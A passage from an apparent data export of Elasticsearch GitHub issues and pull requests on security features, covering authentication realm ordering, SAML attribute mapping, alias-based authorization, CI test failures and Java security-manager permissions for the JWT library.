  setting 'xpack.security.authc.realms.kerberos.kerb6.order', '6'
  setting 'xpack.security.authc.realms.oidc.openid7.order', '7'
  setting 'xpack.security.authc.realms.jwt.jwt8.order', '8'
```
[x-pack/plugin/security/src/internalClusterTest/java/org/elasticsearch/xpack/security/authc/SecurityRealmSettingsTests.java](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/internalClusterTest/java/org/elasticsearch/xpack/security/authc/SecurityRealmSettingsTests.java#L68)
```
.put(""xpack.security.authc.realms.file.file1.order"", 1)
.put(""xpack.security.authc.realms.native.native1.order"", 2)
.put(""xpack.security.authc.realms.ldap.ldap1.order"", 3)
.put(""xpack.security.authc.realms.active_directory.ad1.order"", 4)
.put(""xpack.security.authc.realms.pki.pki1.order"", 5)
.put(""xpack.security.authc.realms.saml.saml1.order"", 6)
.put(""xpack.security.authc.realms.kerberos.kerb1.order"", 7)
.put(""xpack.security.authc.realms.oidc.oidc1.order"", 8)
.put(""xpack.security.authc.realms.jwt.jwt9.order"", 9)
```

Response (@tvernum):

I think we can consider SecurityRealmSettingsTests to be obsolete. The QA test is better because it actually starts a real node.
I think it's worth opening an issue to review whether the QA test covers everything that is in SecurityRealmSettingsTests and then delete SecurityRealmSettingsTests.

Context:

Found during PR #84249: [Add smoke test for JWT realm wiring](https://github.com/elastic/elasticsearch/pull/84249)
Link to Tim's comment: https://github.com/elastic/elasticsearch/pull/84249#issuecomment-1050372509","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,346726572,"SAML realm external monitoring cluster support [elasticsearch]","Today it's not possible to use an external monitoring cluster with SAML.

@tvernum explained it well

When you login with SAML you get an elasticsearch security token for the cluster you are logged in to. Those tokens are cluster specific, there is no mechanism by which you can use them in another cluster.

The only way this could be made to work (within the current ES behaviour) would be for Kibana to generate a token for the monitoring cluster at the same time as your generate the local cluster token.
But that's tricky because SAML assertions are intended to be for a single Service Provider, so you would need to configure the 2 clusters identically so that they thought they were the same Service Provider.
That might be possible for a single prod + monitoring, but would not scale if you have multiple ""prod"" clusters/kibanas all trying to get to the same monitoring cluster.","Pinging @elastic/es-security@joshbressers I think this probably needs to be a Kibana issue. It's possible we could build some sort of cross-cluster auth setup, but it would need to be driven as a Kibana requirement.

The Kibana issue is here
https://github.com/elastic/kibana/issues/21611",no,":Security/Authentication,Team:Security,"
elastic/elasticsearch,317448863,"Switch security to authorise on indices rather than aliases ","*Original comment by @tvernum:*

We've discussed this a number of times in the past. The current approach of authorising based on aliases was an attempt to offer something a bit like DLS, prior to our proper DLS implementation.

Switching to only authorise on indices would make a lot of the code simpler, but would be a breaking change (and is complicated by license levels, aliases work in Gold, but DLS is in Platinum).

Opening this ticket as a place for discussion.


","This was discussed in today's team meeting. Given the complexity that alias authorization adds, we agreed that this is a breaking change we should make to remove complexity and simplify a users ability to reason about a request.I got to think about this, got some feedback from the team at large about use cases that would be impacted by this, and we also had a discussion inside the ES Security team.

The main issue is with ILM, specifically the alias that ILM maintains over the last index in a rollover series. In this situation, the alias points to all indices in the series and it is a write alias for the last index in the series. Therefore a read from the alias, would read from all the indices and a write would write to the last index in the series.
When Security is enabled it is very easy to grant privileges to the user used to ingest data, the administrator simply has to grant read/write on the alias that ILM manages. The ingest user doesn't have to be concerned with the indices backing up the alias it is accessing.

However, this mechanism of an alias carrying around privileges and pointing to various indices is exactly the confusing behavior we wish to remediate. Removing privs on aliases would move privileges closer to the data in the index, since an index cannot be renamed.

We have brainstormed some ideas, some of which need more careful scrutiny:
* in Core, change the rollover action so that it makes a rolled over index read only. This way, with Security, an administrator grants read/write to the full index series.
* in Security, provide a way to define privileges on the last index in a series; right now with wildcards you can only grant privileges on the whole series
* in Core, implement index rename
* in Security, authorize on more than names. That is, the administrator has the option to grant privileges for indices with some specific metadata attribute.",no,">feature,>breaking,:Security/Authorization,Team:Security,"
elastic/elasticsearch,663139224,"[CI] SSLDriverTests.testCloseDuringHandshakePreJDK11 failure","**Build scan**:

https://gradle-enterprise.elastic.co/s/ahz2ynpcdojem

**Repro line**:

./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.transport.nio.SSLDriverTests.testCloseDuringHandshakePreJDK11"" \
  -Dtests.seed=5F3BA4437FFF1B03 \
  -Dtests.security.manager=true \
  -Dtests.locale=mk \
  -Dtests.timezone=Africa/Libreville \
  -Druntime.java=8

**Reproduces locally?**:

No

**Failure history**:
About four failures over the last day, all on 7.x and 7.9

**Error**

junit.framework.AssertionFailedError: Expected exception SSLException but no exception was thrown
	at __randomizedtesting.SeedInfo.seed([5F3BA4437FFF1B03:28FE67445C990EEF]:0)
	at org.apache.lucene.util.LuceneTestCase.expectThrows(LuceneTestCase.java:2744)
	at org.apache.lucene.util.LuceneTestCase.expectThrows(LuceneTestCase.java:2734)
	at org.elasticsearch.xpack.security.transport.nio.SSLDriverTests.testCloseDuringHandshakePreJDK11(SSLDriverTests.java:267)
","Another failure: https://gradle-enterprise.elastic.co/s/5jy3xg3dkyqse

```
org.elasticsearch.xpack.security.transport.nio.SSLDriverTests > testCloseDuringHandshakePreJDK11 FAILED
    junit.framework.AssertionFailedError: Expected exception SSLException but no exception was thrown
        at __randomizedtesting.SeedInfo.seed([CA607E45E6C3499F:BDA5BD42C5A55C73]:0)
        at org.apache.lucene.util.LuceneTestCase.expectThrows(LuceneTestCase.java:2743)
        at org.apache.lucene.util.LuceneTestCase.expectThrows(LuceneTestCase.java:2733)
        at org.elasticsearch.xpack.security.transport.nio.SSLDriverTests.testCloseDuringHandshakePreJDK11(SSLDriverTests.java:267)
```
Repro line:
```
./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.transport.nio.SSLDriverTests.testCloseDuringHandshakePreJDK11"" -Dtests.seed=CA607E45E6C3499F -Dtests.security.manager=true -Dtests.locale=es -Dtests.timezone=BET -Druntime.java=8
```Another: https://gradle-enterprise.elastic.co/s/hmegh3d5wmqew

Going to push mutes to 7.8/7.9/7.x",no,">test-failure,:Security/TLS,"
elastic/elasticsearch,1247996828,"[CI] Compile failure in example plugins :security-authorization-engine:compileJava","### CI Link

	https://elasticsearch-ci.elastic.co/job/elastic+elasticsearch+main+periodic+example-plugins/131/console

### Repro line

none

### Does it reproduce?

Didn't try

### Applicable branches

main

### Failure history

Two times today already

### Failure excerpt

13:43:40 > Task :security-authorization-engine:compileJava
13:43:40 /dev/shm/elastic+elasticsearch+main+periodic+example-plugins/plugins/examples/security-authorization-engine/src/main/java/org/elasticsearch/example/CustomAuthorizationEngine.java:189: error: cannot find symbol
13:43:40             new PrivilegesCheckResult.Details(clusterPrivMap, indices, privilegesByApplication));
13:43:40                                      ^
13:43:40   symbol:   class Details
13:43:40   location: class PrivilegesCheckResult
13:43:40 Note: /dev/shm/elastic+elasticsearch+main+periodic+example-plugins/plugins/examples/security-authorization-engine/src/main/java/org/elasticsearch/example/CustomAuthorizationEngine.java uses or overrides a deprecated API.
13:43:40 Note: Recompile with -Xlint:deprecation for details.
13:43:40 1 error
13:43:40 
13:43:40 > Task :security-authorization-engine:compileJava FAILED","Pinging @elastic/es-core-infra (Team:Core/Infra)Pinging @elastic/es-security (Team:Security)Probably related to 346abf9816e20057192776092ed6646a3cbb1fbf, so I'm assigning to @albertzaharovits @mark-vieira is looking at it.This actually was fixed in the related PR but we are waiting on an updated snapshot build with the changes.",no,":Core/Infra/Plugins,>test-failure,:Security/Security,Team:Core/Infra,Team:Security,"
elastic/elasticsearch,577304456,"Enhance our docs for attribute/claims mapping for SAML and OIDC","We should do a better job at describing the ""journey"" of an attribute from the Identity Providers user repository storage to becoming part of a role mapping rule in Elasticsearch. We should detail the nuances and details between attribute/claim names and values and which of these two (names vs values ) should be used in various configuration contexts ( `attributes.groups`, role mapping rules etc. ) 

This comes up _very_ often in forums and via support and it's obvious our documentation is not sufficient or clear enough.","Pinging @elastic/es-security (:Security/Authentication)Pinging @elastic/es-docs (>docs)@jkakavas The following explanation that was usefull more than once to better undertand could be added to SAML documentation (not specific to OIDC):

`attributes.groups: X` in SAML realm config means : "" Read the SAML Response the IDP sent over and find a SAML Attribute named X , then get all of its values and assign them to the Elasticsearch's user property `groups`"" 

Let's say SAML Response contains the following fragment

```
<saml:AttributeStatement>
      <saml:Attribute Name=""uid"" NameFormat=""urn:oasis:names:tc:SAML:2.0:attrname-format:basic"">
        <saml:AttributeValue xsi:type=""xs:string"">test</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name=""mail"" NameFormat=""urn:oasis:names:tc:SAML:2.0:attrname-format:basic"">
        <saml:AttributeValue xsi:type=""xs:string"">test@example.com</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name=""XXXXXXX"" NameFormat=""urn:oasis:names:tc:SAML:2.0:attrname-format:basic"">
        <saml:AttributeValue xsi:type=""xs:string"">YYYY</saml:AttributeValue>
        <saml:AttributeValue xsi:type=""xs:string"">ZZZZ</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
```

This means that if  setting `attributes.groups: XXXXXXX`,  like this, then ES would map `YYYY` and `ZZZZ` as values of the Elasticsearch user's property `groups` and then these values could be used in a role mapping. 

```
{
  ""CLOUD_SAML_ELASTICADMIN_TO_SUPERUSER"" : {
    ""enabled"" : true,
    ""roles"" : [
      ""superuser""
    ],
    ""rules"" : {
      ""all"" : [
        {
          ""field"" : {
            ""realm.name"" : ""cloud-saml""
          }
        },
        {
          ""field"" : {
            ""groups"" : ""ZZZZZ""
          }
        }
      ]
    },
    ""metadata"" : {
      ""version"" : 1
    }
  }
}
```",no,">docs,:Security/Authentication,Team:Security,"
elastic/elasticsearch,741375977,"Index date math expression when defining index permissions","To grant index permissions, wildcards and lucene regexps can be used in the name field of the index permission in the role definition.
The wildcards and regexps can cover indices, data streams, as well as alias names, although we're planning to remove support for aliases in the coming major release (v8) (because of issues, such as https://github.com/elastic/elasticsearch/issues/61547 and https://github.com/elastic/elasticsearch/issues/32238).

But aliases can be utilised by ILM rollover policies with indices that follow a naming pattern containing dates.
If we're going to take away the option to grant permissions on aliases, I think we should facilitate granting permissions on index names containing dates, by permitting using [date math expressions](https://www.elastic.co/guide/en/elasticsearch/reference/current/date-math-index-names.html) in the name field of the index expression. The `now` token is especially useful.

Related https://discuss.elastic.co/t/range-query-in-doc-lvl-security/254431","Pinging @elastic/es-security (:Security/Authorization)Interesting proposal. Do you think there may be some issue with caching if we allow dynamic dates using `now`?",no,">enhancement,:Security/Authorization,team-discuss,Team:Security,"
elastic/elasticsearch,825174126,"[Feature Request] More fine-grained privileges with manage_index_templates & manage_pipelines","Using the feature `File Data Visualizer` will require `ingest_admin` role.
This gives the `manage_index_templates` and `manage_ingest_pipelines` cluster role to the user.
https://www.elastic.co/guide/en/machine-learning/current/setup.html#setup-privileges
https://www.elastic.co/guide/en/elasticsearch/reference/current/built-in-roles.html
https://www.elastic.co/guide/en/elasticsearch/reference/current/security-privileges.html

However, this will expose all the index templates & policies etc to users.
Is there a way to provides stricter controls when allowing the use of data visualizer?
","Pinging @elastic/es-security (Team:Security)Pinging @elastic/ml-core (Team:ML)Related to #53110",no,">enhancement,:ml,:Security/Authorization,Team:Security,Team:ML,"
elastic/elasticsearch,1153765019,"ArchiveGenerateInitialCredentialsTests failures","In ArchiveGenerateInitialCredentialsTests, we try to capture the output of a node starting in order to validate that the security auto-configuration information is actually printed out and is correct. 
It turns out that the way we run the tests in CI is not compatible to how we try to determine whether there is a terminal attached to elasticsearch. Since we can't determine if a terminal is attached, we do not print the information and thus the tests fail. 

Originally, I assumed that this is because of how we run elasticsearch with `expect`, or because our use of `spawn` but the failure doesn't replicate locally. i.e. I can run

```
expect - <<EXPECT
set timeout 30
spawn -ignore HUP bin/elasticsearch
expect {
   ""uncaught exception"" { send_user ""\nStartup failed due to uncaught exception\n""; exit 1 }
   timeout { send_user ""\nTimed out waiting for startup to succeed\n""; exit 1 }
   eof { send_user ""\nFailed to determine if startup succeeded\n""; exit 1 }
   ""Configure other nodes to join this cluster*""
}
EXPECT
```

which is what we effectively do in https://github.com/elastic/elasticsearch/blob/master/qa/os/src/test/java/org/elasticsearch/packaging/util/Archives.java#L235 

and elasticsearch will print out the auto-configuration information and expect will exit after seeing `Configure other nodes to join this cluster` in the output. 

In CI, https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/InitialNodeSecurityAutoConfiguration.java#L197 , console is null and so we elect to not print out the security information. We need to determine why that happens. 

Tagging with the delivery team too, in case they have some insights :pray: ","Pinging @elastic/es-delivery (Team:Delivery)Pinging @elastic/es-security (Team:Security)We could start with `AnsiConsoleLoader.isValidConsole()`. It might be deciding that in CI, the console isn't usable and therefore returning null.How would we feel about adding a system property like `-Des.force_stdout_is_console=true` so we can test the console output when we need to.
",no,":Delivery/Build,>test-failure,:Security/Security,Team:Security,Team:Delivery,"
elastic/elasticsearch,1065423472,"Cmd line tool talks HTTP with the local node only","We have added two new cmd line tools that only talk to the local node, see `BaseRunAsSuperuserCommand`.
It was intentional that the level of access privilege to invoke these tools be that of the system adminitrator, the one which usually deals with the TLS keys and file based credentials.

The issue we're seeing is that the tools have to rely on guessing the local node's http network socket. The `elasticsearch.yml` is helpful, but there's still guessing involved, see https://github.com/elastic/elasticsearch/issues/80481 . If the guesing is wrong the tool throws connection or certificate verify exceptions which then requires some reasoning from the human.

Can we make it easier to automatically figure out the HTTP network socket of the node, given access to its config directory, ie output the `node.portsfile`? Alternatively, could we open a UNIX domain socket?

Are there other cases where we might need that a cmd line tool only be able to talk to the local node?
- Node shutdown ?

","Pinging @elastic/es-core-infra (Team:Core/Infra)Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Security,Team:Core/Infra,Team:Security,:Core/Infra/CLI,"
elastic/elasticsearch,1370157897,"[8.3] Mention internal user `_security_profile` in docs (#89100)","Backports the following commits to 8.3:
 - Mention internal user `_security_profile` in docs (#89100)",,yes,">docs,:Security/Authentication,backport,Team:Docs,Team:Security,auto-merge,v8.3.4,"
elastic/elasticsearch,1263897383,"Upload license reminder","One user reached out mentioning that it would be a good idea to remind users to re-upload the license after full cluster receovery from snapshot as one can easily miss this when trying to figure out why some features aren't working after the restore.

<!--
Thank you for your interest in and contributing to Elasticsearch! There
are a few simple things to check before submitting your pull request
that can help with the review process. You should delete these items
from your submission, but they are here to help bring them to your
attention.
-->

- Have you signed the [contributor license agreement](https://www.elastic.co/contributor-agreement)?
- Have you followed the [contributor guidelines](https://github.com/elastic/elasticsearch/blob/master/CONTRIBUTING.md)?
- If submitting code, have you built your formula locally prior to submission with `gradle check`?
- If submitting code, is your pull request against master? Unless there is a good reason otherwise, we prefer pull requests against master and will backport as needed.
- If submitting code, have you checked that your submission is for an [OS and architecture that we support](https://www.elastic.co/support/matrix#show_os)?
- If you are submitting this code for a class then read our [policy](https://github.com/elastic/elasticsearch/blob/master/CONTRIBUTING.md#contributing-as-part-of-a-class) for that.
","@TheRiffRafi please enable the option ""Allow edits and access to secrets by maintainers"" on your PR. For more information, [see the documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/allowing-changes-to-a-pull-request-branch-created-from-a-fork).Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)Thanks @gwbrown for opening this issue.
Would it be better to load the license before restoring data? I'm not sure if this has drawbacks and it's possible in general, but I think that it may be safer in case of paid features use.
What do you think?@bytebilly To be clear, I didn't open this issue; this is a community PR that I decided to shepherd. To add some context to this, the license is kept in the cluster state, which is overwritten when a snapshot is restored with `include_global_state: true` (the default is `false`), which also overwrites all index templates, ILM policies, and everything else stored in cluster state.

The issue is that restoring the snapshotted cluster state may restore an old license (or at least so it appears from this contribution and reading the relevant code). I agree that it would be best to address this with a technical solution - it's weird that restoring a snapshot restores the license - but doing so will take time as we'll have to build new functionality to do that, so adding a note to the documentation here might not be a bad idea until we can do so. I do have some thoughts about the wording that I'll write up soon as a proper review.> it's weird that restoring a snapshot restores the license

I can understand that it might be surprising in some cases, but if you are using snapshot + restore to migrate a cluster (e.g. to move to a different cloud provider) then having everything come along with you (including the license) is exactly the right behaviour. ""weird"" is going to be in the eye of the beholder.",yes,">docs,:Security/License,Team:Docs,Team:Security,external-contributor,v8.6.0,"
elastic/elasticsearch,1384151021,"Seed SecureRandom with -Dtests.seed for JWK RSA/EC/HMAC keygen in JWT tests","The purpose of this PR is to support easy reproduction of an [intermittent CI Test failure](https://github.com/elastic/elasticsearch/issues/89509).

I strongly suspect it is hard to reproduced because JWK keygen is using default SecureRandom, and there is no LuceneTestCase.secureRandom() available. LuceneTestCase only offers random() for using -Dtests.seed.

This PR depends on [PR #93](https://bitbucket.org/connect2id/nimbus-jose-jwt/pull-requests/93/add-support-to-use-securerandom-in) submitted to nimbus-jose-jwt. My PR was accepted into [v9.25](https://mvnrepository.com/artifact/com.nimbusds/nimbus-jose-jwt/9.25).

https://bitbucket.org/connect2id/nimbus-jose-jwt/src/master/CHANGELOG.txt
```
version 9.25 (2022-09-13)
    * Adds support to use a SecureRandom in RSAKeyGenerator.generate() and
      ECKeyGenerator.generate().
```","Adding @mark-vieira as a reviewer since this is related to test reproduction infrastructure.

When I run with the current code changes, I am getting an access denied error from Security Manager. I am looking for feedback how to workaround this issue, either via a code change or a config change. I think it relates to however elasticsearch is using a custom Security Manager, and I am not familiar with those details.

```
REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests.testJwkSetUpdates"" -Dtests.seed=E930884F377FE425 -Dtests.locale=ar-SD -Dtests.timezone=Asia/Makassar -Druntime.java=18

access denied (""java.lang.RuntimePermission"" ""accessDeclaredMembers"")
java.security.AccessControlException: access denied (""java.lang.RuntimePermission"" ""accessDeclaredMembers"")
	at __randomizedtesting.SeedInfo.seed([E930884F377FE425:DBEF29C6CE70B5B1]:0)
	at java.base/java.security.AccessControlContext.checkPermission(AccessControlContext.java:485)
	at java.base/java.security.AccessController.checkPermission(AccessController.java:1068)
	at java.base/java.lang.SecurityManager.checkPermission(SecurityManager.java:411)
	at java.base/java.lang.Class.checkMemberAccess(Class.java:3083)
	at java.base/java.lang.Class.getDeclaredConstructor(Class.java:2782)
	at com.nimbusds.jose.shaded.gson.internal.ConstructorConstructor.newDefaultConstructor(ConstructorConstructor.java:193)
	at com.nimbusds.jose.shaded.gson.internal.ConstructorConstructor.get(ConstructorConstructor.java:101)
	at com.nimbusds.jose.shaded.gson.internal.bind.MapTypeAdapterFactory.create(MapTypeAdapterFactory.java:126)
	at com.nimbusds.jose.shaded.gson.Gson.getAdapter(Gson.java:531)
	at com.nimbusds.jose.shaded.gson.Gson.toJson(Gson.java:778)
	at com.nimbusds.jose.shaded.gson.Gson.toJson(Gson.java:756)
	at com.nimbusds.jose.shaded.gson.Gson.toJson(Gson.java:711)
	at com.nimbusds.jose.shaded.gson.Gson.toJson(Gson.java:691)
	at com.nimbusds.jose.util.JSONObjectUtils.toJSONString(JSONObjectUtils.java:523)
	at org.elasticsearch.xpack.security.authc.jwt.JwtUtil.serializeJwkSet(JwtUtil.java:228)
	at org.elasticsearch.xpack.security.authc.jwt.JwtIssuer.setJwks(JwtIssuer.java:90)
	at org.elasticsearch.xpack.security.authc.jwt.JwtRealmTestCase.createJwtIssuer(JwtRealmTestCase.java:216)
	at org.elasticsearch.xpack.security.authc.jwt.JwtRealmTestCase.generateJwtIssuerRealmPairs(JwtRealmTestCase.java:163)
	at org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests.testJwkSetUpdates(JwtRealmAuthenticateTests.java:102)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
	at java.base/java.lang.reflect.Method.invoke(Method.java:577)
	at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
	at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
	at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
	at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
	at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
	at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
	at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
	at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
	at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
	at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
	at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
	at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
	at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
	at java.base/java.lang.Thread.run(Thread.java:833)
111@elasticmachine update branch@elasticmachine update branch@ChrisHegarty might have some ideas on how to get around the security manager problem, although if this PR is never meant to be merged and we're just trying to repro a failure, you could just temporarily add the necessary permission [here](https://github.com/elastic/elasticsearch/blob/600cb9108071a63f2c63a8fffa21c34e15251433/server/src/main/resources/org/elasticsearch/bootstrap/test-framework.policy).I clobbered the PR contents when copying a temp fix over from a different PR. Trying to restore.@elasticmachine update branch> @ChrisHegarty might have some ideas on how to get around the security manager problem, although if this PR is never meant to be merged and we're just trying to repro a failure, you could just temporarily add the necessary permission [here](https://github.com/elastic/elasticsearch/blob/600cb9108071a63f2c63a8fffa21c34e15251433/server/src/main/resources/org/elasticsearch/bootstrap/test-framework.policy).

The library update and test changes are meant to be permanent.It's curious why this permission is now suddenly an issue, i.e. what changed to cause the permission to fail?

To create some test specific data, the test is using `com.nimbusds.jose.util.JSONObjectUtils`, which internally uses `Gson` that ends up invoking `Class::getDeclaredConstructor` - which ultimately triggers the permission check. Why was Gson working ok before? There's likely a lot of changes between `nimbus-jose-jwt:9.8.1` and `nimbus-jose-jwt:9.25`, so maybe this was just introduced by some internal refactoring. If so, then adding the permission to the test framework permission grant is the right permanent solution.@ChrisHegarty, there are two changes.
1. Add calls to `SecureRandom.getStrongInstance()` and `SecureRandom.setSeed(LuceneTestCase.randomBytes(32))`.
2. Pass SecureRandom instance to updated RSA/EC JwkGenerator utils inside nimbus-jose-jwt:9.25.

The security management exception is triggers by 1. The call to the updated library has not taken place yet.

The original problem is LuceneTestCase has random() but not secureRandom(). Short term, I am trying to use random() to seed a SecureRandom, to make it deterministic based on -Dtests.seed. Long term, it would be nice to move this into a new LuceneTestCase.secureRandom() so it is available for all test code to use.@elasticmachine update branch@ChrisHegarty @mark-vieira I tried to add `accessDeclaredMembers` to policy in [050e624](https://github.com/elastic/elasticsearch/pull/90315/commits/050e62426d66656926b2fbc00cae807b5ead0da0), but it is not working. I am not familiar with how to update the policy, so I don't know if I am doing it right.@elasticmachine update branchmerge conflict between base and head@elasticmachine update branchexpected head sha didn’t match current head ref.@elasticmachine update branch@elasticmachine update branch@elasticmachine update branchPinging @elastic/es-security (Team:Security)Still not having any luck making the `idp-fixture` work when running `./gradlew :x-pack:qa:oidc-op-tests:javaRestTest`
 
Here are the two new jar versions inside the `elasticsearch:test` container for the `idp-fixture`.
```
elasticsearch@a5e916359ac3:~$ ls -l /usr/share/elasticsearch/modules/x-pack-security/nimbus-jose-jwt-9.25.4.jar /usr/share/elasticsearch/modules/x-pack-security/oauth2-oidc-sdk-9.43.1.jar
-r--r--r-- 1 root root 681930 Oct  6 18:51 /usr/share/elasticsearch/modules/x-pack-security/nimbus-jose-jwt-9.25.4.jar
-r--r--r-- 1 root root 820689 Oct  6 18:51 /usr/share/elasticsearch/modules/x-pack-security/oauth2-oidc-sdk-9.43.1.jar
```
Here is the x-pack `plugin-security.policy` inside the `idp-container` with my new additions.
```
elasticsearch@de8b37bf3e0a:~$ tail -11 /usr/share/elasticsearch/modules/x-pack-security/plugin-security.policy
grant codeBase ""${codebase.nimbus-jose-jwt}"" {
  // needed for com.nimbusds.jose.shaded.gson.Gson.toJson
  permission java.lang.RuntimePermission ""accessDeclaredMembers"";
};

grant codeBase ""${codebase.oauth2-oidc-sdk}"" {
  // needed for com.nimbusds.oauth2.sdk.id.Identifier#value
  permission java.lang.reflect.ReflectPermission ""suppressAccessChecks"";
};
```

Those two permissions were needed to fix OIDC unit tests that run inside IntelliJ. The same permissions are not working for OIDC integ tests inside the `idp-fixture` `elasticsearch:test` container. Here is the exception copied from `/usr/share/elasticsearch/logs/console.log`. It corresponds to the first permission, so I was expecting the OIDC integ test to work.
```
java.security.AccessControlException: access denied (""java.lang.RuntimePermission"" ""accessDeclaredMembers"")
	at java.base/java.security.AccessControlContext.checkPermission(AccessControlContext.java:485)
	at java.base/java.security.AccessController.checkPermission(AccessController.java:1068)
	at java.base/java.lang.SecurityManager.checkPermission(SecurityManager.java:411)
	at java.base/java.lang.Class.checkMemberAccess(Class.java:3083)
	at java.base/java.lang.Class.getDeclaredConstructor(Class.java:2782)
	at com.nimbusds.jose.jwt@9.25.4/com.nimbusds.jose.shaded.gson.internal.ConstructorConstructor.newDefaultConstructor(ConstructorConstructor.java:193)
	at com.nimbusds.jose.jwt@9.25.4/com.nimbusds.jose.shaded.gson.internal.ConstructorConstructor.get(ConstructorConstructor.java:101)
	at com.nimbusds.jose.jwt@9.25.4/com.nimbusds.jose.shaded.gson.internal.bind.MapTypeAdapterFactory.create(MapTypeAdapterFactory.java:126)
	at com.nimbusds.jose.jwt@9.25.4/com.nimbusds.jose.shaded.gson.Gson.getAdapter(Gson.java:531)
	at com.nimbusds.jose.jwt@9.25.4/com.nimbusds.jose.shaded.gson.Gson.toJson(Gson.java:778)
	at com.nimbusds.jose.jwt@9.25.4/com.nimbusds.jose.shaded.gson.Gson.toJson(Gson.java:756)
	at com.nimbusds.jose.jwt@9.25.4/com.nimbusds.jose.shaded.gson.Gson.toJson(Gson.java:711)
	at com.nimbusds.jose.jwt@9.25.4/com.nimbusds.jose.shaded.gson.Gson.toJson(Gson.java:691)
	at com.nimbusds.jose.jwt@9.25.4/com.nimbusds.jose.util.JSONObjectUtils.toJSONString(JSONObjectUtils.java:527)
	at com.nimbusds.jose.jwt@9.25.4/com.nimbusds.jwt.JWTClaimsSet.toString(JWTClaimsSet.java:882)
	at oauth2.oidc.sdk@9.43.1/com.nimbusds.oauth2.sdk.util.JSONObjectUtils.toJSONObject(JSONObjectUtils.java:904)
	at oauth2.oidc.sdk@9.43.1/com.nimbusds.openid.connect.sdk.claims.IDTokenClaimsSet.<init>(IDTokenClaimsSet.java:238)
	at oauth2.oidc.sdk@9.43.1/com.nimbusds.openid.connect.sdk.validators.IDTokenValidator.toIDTokenClaimsSet(IDTokenValidator.java:372)
	at oauth2.oidc.sdk@9.43.1/com.nimbusds.openid.connect.sdk.validators.IDTokenValidator.validate(IDTokenValidator.java:322)
	at oauth2.oidc.sdk@9.43.1/com.nimbusds.openid.connect.sdk.validators.IDTokenValidator.validate(IDTokenValidator.java:254)
